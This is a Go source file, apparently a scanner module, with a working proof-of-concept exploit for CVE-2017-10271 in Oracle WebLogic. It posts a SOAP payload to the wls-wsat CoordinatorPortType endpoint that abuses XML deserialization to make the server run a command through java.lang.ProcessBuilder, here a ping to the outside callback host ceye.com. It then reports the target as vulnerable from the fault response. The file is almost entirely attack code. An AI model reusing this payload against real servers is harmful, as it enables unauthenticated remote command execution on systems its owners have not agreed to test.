package CVE_2017_10271

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

var VUL = "CVE-2017-10271"

func poc(server_addr string) {
	url := "http://" + server_addr + "/wls-wsat/CoordinatorPortType"

	post_str := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
`
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: time.Duration(5 * time.Second),
	}
	request, err := http.NewRequest("POST", url, strings.NewReader(post_str))
	request.Header.Set("User-Agent", "ceshi/0.0.1")
	request.Header.Set("Content-Type", "text/xml")
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	response, err := client.Do(request)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
		return
	}
	//fmt.Println("body:", string(body))

	//a := strings.Index(string(body), "<faultstring>java.lang.ProcessBuilder")
	//b := strings.Index(string(body), "<faultstring>0")

	if (strings.Contains(string(body), "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(string(body), "<faultstring>0")) {
		fmt.Printf("[+] The target weblogic has a JAVA deserialization vulnerability: %s\n", VUL)
	} else {
		fmt.Printf("[-] Target weblogic not detected %s\n", VUL)
	}

}

func Run(rip string, rport string) {
	server_addr := rip + ":" + rport
	poc(server_addr)
}
